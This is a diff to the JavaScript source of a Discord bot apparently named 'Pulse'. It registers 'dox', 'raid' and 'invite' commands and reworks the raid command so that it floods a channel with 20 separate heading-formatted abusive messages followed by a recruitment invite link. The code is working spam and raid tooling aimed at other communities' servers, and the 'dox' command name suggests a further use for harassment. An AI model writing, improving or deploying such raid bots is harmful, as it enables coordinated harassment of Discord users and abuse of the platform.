@@ -43,20 +43,22 @@ app.listen(PORT, () => {
 });
 
 // ---- DISCORD BOT ----
-client.once('ready', () => {
+client.once('ready', async () => {
     console.log(`🤖 Logged in as ${client.user.tag}`);
     
-    client.application.commands.set([])
-        .then(() => {
-            console.log('✅ Cleared old commands');
-            return client.application.commands.set([
-                { name: 'dox', description: 'Generate a fresh link' },
-                { name: 'raid', description: 'Flood the channel with a raid message' },
-                { name: 'invite', description: 'Get an invite link for Pulse' }
-            ]);
-        })
-        .then(() => console.log('✅ Commands registered'))
-        .catch(console.error);
+    try {
+        await client.application.commands.set([]);
+        console.log('✅ Cleared old commands');
+        
+        await client.application.commands.set([
+            { name: 'dox', description: 'Generate a fresh link' },
+            { name: 'raid', description: 'Flood the channel with a raid message' },
+            { name: 'invite', description: 'Get an invite link for Pulse' }
+        ]);
+        console.log('✅ Commands registered');
+    } catch (error) {
+        console.error('❌ Failed to register commands:', error);
+    }
 });
 
 client.on('interactionCreate', async (interaction) => {
@@ -86,7 +88,7 @@ client.on('interactionCreate', async (interaction) => {
         await interaction.editReply({ embeds: [embed] });
     }
 
-    // ---- RAID (updated message) ----
+    // ---- RAID (20 heading messages) ----
     if (interaction.commandName === 'raid') {
         await interaction.deferReply({ ephemeral: true });
 
@@ -95,18 +97,13 @@ client.on('interactionCreate', async (interaction) => {
             return interaction.editReply('❌ This command can only be used in a server channel.');
         }
 
-        // Build the raid message — 20 lines of spam + invite
-        const spamLines = [];
-        for (let i = 0; i < 20; i++) {
-            spamLines.push('THIS SERVER IS FUCKING TRASH PULSE OWNS YOU ALL');
-        }
-        spamLines.push(`join pulse to get raids like this: ${INVITE_LINK}`);
-        
-        const raidMessage = spamLines.join('\n');
-
         try {
-            await channel.send(raidMessage);
-            await interaction.editReply('✅ Raid sent successfully.');
+            for (let i = 0; i < 20; i++) {
+                await channel.send('# THIS SERVER IS FUCKING TRASH PULSE OWNS YOU ALL');
+            }
+            await channel.send(`join pulse to get raids like this: ${INVITE_LINK}`);
+            
+            await interaction.editReply('✅ Raid sent successfully (20 heading messages).');
         } catch (error) {
             console.error('Raid failed:', error);
             await interaction.editReply('❌ Failed to send raid. Check bot permissions.');
